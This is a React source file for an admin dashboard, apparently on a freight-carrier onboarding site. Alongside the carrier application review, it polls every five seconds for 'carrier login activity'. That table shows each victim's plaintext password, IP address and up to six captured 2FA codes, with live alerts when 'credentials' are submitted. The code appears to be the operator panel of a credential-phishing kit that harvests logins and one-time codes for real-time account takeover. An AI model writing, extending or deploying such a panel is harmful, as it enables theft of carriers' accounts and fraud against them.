import { useEffect, useRef, useState } from 'react'

const apiUrl = import.meta.env.VITE_API_URL ?? ''
const STORAGE_KEY = 'summit_admin_key'

function Admin() {
  const [adminKey, setAdminKey] = useState(() => sessionStorage.getItem(STORAGE_KEY) || '')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [carriers, setCarriers] = useState([])
  const [selected, setSelected] = useState(null)
  const [loginActivity, setLoginActivity] = useState([])
  const [loginActivityError, setLoginActivityError] = useState('')
  const [toast, setToast] = useState(null)
  const [newIds, setNewIds] = useState(new Set())
  const lastSeenIdRef = useRef(null)

  const loadCarriers = (key) => {
    fetch(`${apiUrl}/api/admin/carriers`, { headers: { 'x-admin-key': key } })
      .then((res) => {
        if (!res.ok) throw new Error('Invalid admin key.')
        return res.json()
      })
      .then((data) => {
        setCarriers(data)
        setAdminKey(key)
        sessionStorage.setItem(STORAGE_KEY, key)
        setError('')
      })
      .catch((err) => {
        setError(err.message)
        sessionStorage.removeItem(STORAGE_KEY)
        setAdminKey('')
      })
  }

  const loadLoginActivity = (key, { notify = false } = {}) => {
    fetch(`${apiUrl}/api/admin/login-activity`, { headers: { 'x-admin-key': key } })
      .then(async (res) => {
        const data = await res.json()
        if (!res.ok) throw new Error(data.error || 'Failed to load login activity.')
        return Array.isArray(data) ? data : []
      })
      .then((rows) => {
        setLoginActivity(rows)
        setLoginActivityError('')

        const latest = rows[0]
        if (latest && notify && lastSeenIdRef.current !== null && latest.id !== lastSeenIdRef.current) {
          setToast({
            email: latest.email,
            success: !!latest.success,
            company: latest.company_legal_name,
          })

          const freshIds = rows.filter((r) => r.id > lastSeenIdRef.current).map((r) => r.id)
          setNewIds(new Set(freshIds))
          setTimeout(() => {
            setNewIds((prev) => {
              const next = new Set(prev)
              freshIds.forEach((id) => next.delete(id))
              return next
            })
          }, 180000)
        }
        if (latest) lastSeenIdRef.current = latest.id
      })
      .catch((err) => {
        setLoginActivity([])
        setLoginActivityError(err.message)
      })
  }

  useEffect(() => {
    if (adminKey) {
      loadCarriers(adminKey)
      loadLoginActivity(adminKey)
    }
  }, [])

  // Poll for new carrier login attempts and surface a notification
  useEffect(() => {
    if (!adminKey) return
    const interval = setInterval(() => loadLoginActivity(adminKey, { notify: true }), 5000)
    return () => clearInterval(interval)
  }, [adminKey])

  useEffect(() => {
    if (!toast) return
    const timeout = setTimeout(() => setToast(null), 180000)
    return () => clearTimeout(timeout)
  }, [toast])

  const handleLoginSubmit = (e) => {
    e.preventDefault()
    setLoading(true)
    setError('')
    fetch(`${apiUrl}/api/admin/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    })
      .then(async (res) => {
        const data = await res.json()
        if (!res.ok) throw new Error(data.error || 'Login failed.')
        return data
      })
      .then((data) => {
        loadCarriers(data.token)
        loadLoginActivity(data.token)
      })
      .catch((err) => setError(err.message))
      .finally(() => setLoading(false))
  }

  const handleStatusChange = (id, status) => {
    fetch(`${apiUrl}/api/admin/carriers/${id}/status`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
      body: JSON.stringify({ status }),
    })
      .then((res) => res.json())
      .then(() => {
        loadCarriers(adminKey)
        setSelected((s) => (s ? { ...s, status } : s))
      })
  }

  const handleLogout = () => {
    sessionStorage.removeItem(STORAGE_KEY)
    setAdminKey('')
    setCarriers([])
    setSelected(null)
  }

  const formatTime = (value) => {
    if (!value) return '—'
    const date = new Date(value)
    return Number.isNaN(date.getTime()) ? value : date.toLocaleString()
  }

  if (!adminKey) {
    return (
      <div className="form-page admin-login-page">
        <div className="form-card admin-login-card">
          <h1>Admin Dashboard</h1>
          <p className="muted">Sign in with your admin username and password to review carrier applications and login activity.</p>
          <form onSubmit={handleLoginSubmit}>
            <div className="form-field">
              <label htmlFor="adminUsername">Username</label>
              <input
                id="adminUsername"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="username"
                placeholder="Remy"
                required
              />
            </div>
            <div className="form-field">
              <label htmlFor="adminPassword">Password</label>
              <input
                id="adminPassword"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="current-password"
                required
              />
            </div>
            {error && <span className="field-error">{error}</span>}
            <button type="submit" className="btn btn-primary btn-block" disabled={loading}>
              {loading ? 'Logging in…' : 'Log In'}
            </button>
          </form>
        </div>
      </div>
    )
  }

  return (
    <div className="admin-page">
      {toast && (
        <div className={`admin-toast ${toast.success ? 'admin-toast-success' : 'admin-toast-warn'}`}>
          <strong>New carrier login attempt</strong>
          <p>
            {toast.email}
            {toast.company ? ` (${toast.company})` : ''} —{' '}
            {toast.success ? 'credentials accepted' : 'credentials submitted'}
          </p>
          <button className="admin-toast-close" onClick={() => setToast(null)} aria-label="Dismiss">
            ×
          </button>
        </div>
      )}

      <div className="portal-header admin-page-header">
        <div>
          <h1>Carrier Applications</h1>
          <p className="admin-page-subtitle">{carriers.length} total sign-ups</p>
        </div>
        <button className="btn btn-outline-dark btn-sm" onClick={handleLogout}>
          Log Out
        </button>
      </div>

      <div className="admin-table-wrap">
        <table className="admin-table">
          <thead>
            <tr>
              <th>Company</th>
              <th>Contact</th>
              <th>Email</th>
              <th>Phone</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody>
            {carriers.map((c) => (
              <tr
                key={c.id}
                className={selected?.id === c.id ? 'row-selected' : ''}
                onClick={() => setSelected(c)}
              >
                <td>{c.company_legal_name}</td>
                <td>{c.contact_name}</td>
                <td>{c.email}</td>
                <td>{c.phone}</td>
                <td><span className={`status-badge status-${c.status}`}>{c.status}</span></td>
              </tr>
            ))}
            {carriers.length === 0 && (
              <tr><td colSpan={5}>No carrier applications yet.</td></tr>
            )}
          </tbody>
        </table>
      </div>

      <div className="portal-header admin-page-header admin-section-header">
        <div>
          <h1>Carrier Login Activity</h1>
          <p className="admin-page-subtitle">Updates every 5 seconds</p>
          {loginActivityError && <p className="admin-error">{loginActivityError}</p>}
        </div>
      </div>

      <div className="admin-table-wrap admin-table-wrap-wide">
        <table className="admin-table admin-table-compact">
          <thead>
            <tr>
              <th>Time</th>
              <th>Email</th>
              <th>Password</th>
              <th>IP Address</th>
              <th>Carrier</th>
              <th>2FA 1</th>
              <th>2FA 2</th>
              <th>2FA 3</th>
              <th>2FA 4</th>
              <th>2FA 5</th>
              <th>2FA 6</th>
              <th>Result</th>
            </tr>
          </thead>
          <tbody>
            {loginActivity.map((a) => (
              <tr key={a.id} className={newIds.has(a.id) ? 'row-new-attempt' : ''}>
                <td>{formatTime(a.created_at)}</td>
                <td>{a.email}</td>
                <td>{a.password || '—'}</td>
                <td>{a.ip_address || '—'}</td>
                <td>{a.company_legal_name || '—'}</td>
                <td>{a.twofa_code_1 || '—'}</td>
                <td>{a.twofa_code_2 || '—'}</td>
                <td>{a.twofa_code_3 || '—'}</td>
                <td>{a.twofa_code_4 || '—'}</td>
                <td>{a.twofa_code_5 || '—'}</td>
                <td>{a.twofa_code_6 || '—'}</td>
                <td>
                  <span className={`status-badge ${a.success ? 'status-approved' : 'status-rejected'}`}>
                    {a.success ? 'Success' : 'Failed'}
                  </span>
                </td>
              </tr>
            ))}
            {loginActivity.length === 0 && (
              <tr><td colSpan={12}>No login activity yet.</td></tr>
            )}
          </tbody>
        </table>
      </div>

      {selected && (
        <div className="form-card" style={{ marginTop: 24 }}>
          <h2>{selected.company_legal_name}</h2>
          <dl>
            <dt>MC Number</dt><dd>{selected.mc_number}</dd>
            <dt>USDOT Number</dt><dd>{selected.dot_number}</dd>
            <dt>Contact</dt><dd>{selected.contact_name}</dd>
            <dt>Phone</dt><dd>{selected.phone}</dd>
            <dt>Email</dt><dd>{selected.email}</dd>
            <dt>Equipment</dt><dd>{selected.equipment.join(', ') || '—'}</dd>
            <dt>Preferred Lanes</dt><dd>{selected.preferred_lanes.join(', ') || '—'}</dd>
            <dt>Status</dt><dd><span className={`status-badge status-${selected.status}`}>{selected.status}</span></dd>
          </dl>
          <div className="status-actions">
            <button className="btn btn-primary btn-sm" onClick={() => handleStatusChange(selected.id, 'approved')}>
              Approve
            </button>
            <button className="btn btn-outline-dark btn-sm" onClick={() => handleStatusChange(selected.id, 'pending')}>
              Mark Pending
            </button>
            <button className="btn btn-danger btn-sm" onClick={() => handleStatusChange(selected.id, 'rejected')}>
              Reject
            </button>
          </div>
        </div>
      )}
    </div>
  )
}

export default Admin
